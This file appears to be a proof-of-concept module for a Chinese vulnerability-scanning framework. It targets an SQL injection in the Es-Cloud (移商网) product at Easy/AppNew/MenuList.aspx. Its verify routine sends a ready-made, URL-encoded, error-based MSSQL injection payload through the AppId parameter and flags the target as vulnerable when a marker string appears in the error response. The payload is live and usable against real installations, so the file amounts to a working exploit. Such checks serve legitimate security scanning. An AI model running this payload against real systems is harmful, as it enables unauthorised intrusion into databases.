# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Es-Cloud_0000' # 平台漏洞编号，留空
    name = 'Es-Cloud通用sa权限SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-30'  # 漏洞公布时间
    desc = '''
        Es-Cloud通用sa权限SQL注入漏洞,漏洞位置：Easy/AppNew/MenuList.aspx.
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '移商网'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '517ef827-0932-46ce-b47a-e551006782a3'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '%20AND%202391%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%2899999-33333%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C100%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29'
            url = '{target}'.format(target=self.target)+'/Easy/AppNew/MenuList.aspx?AppId=11'
            code, head, body, errcode, _url = hh.http(url+payload)
                       
            if code == 500 and 'qpbqq66666qzpxq' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()